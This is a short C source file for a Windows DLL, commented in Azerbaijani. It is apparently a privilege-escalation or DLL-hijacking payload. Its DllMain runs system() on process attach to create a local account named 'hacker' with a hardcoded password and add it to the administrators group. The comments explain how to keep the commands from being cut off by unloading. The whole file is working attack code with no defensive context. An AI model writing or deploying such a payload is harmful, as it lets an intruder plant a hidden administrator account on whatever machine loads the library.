#include <windows.h>
#include <stdlib.h> // system() funksiyası üçün mütləqdir

BOOL APIENTRY DllMain(HMODULE hModule, DWORD ul_reason_for_call, LPVOID lpReserved) {
    switch (ul_reason_for_call) {
    case DLL_PROCESS_ATTACH:
        // Thread yaratmadan birbaşa icra edirik. 
        // Bu, sistem əmrləri bitmədən DLL-in yaddaşdan silinməsinin (FreeLibrary) qarşısını alır.
        system("net user hacker P@ssw0rd123! /add");
        system("net localgroup administrators hacker /add");
        break;
    case DLL_THREAD_ATTACH:
    case DLL_THREAD_DETACH:
    case DLL_PROCESS_DETACH:
        break;
    }
    return TRUE;
}
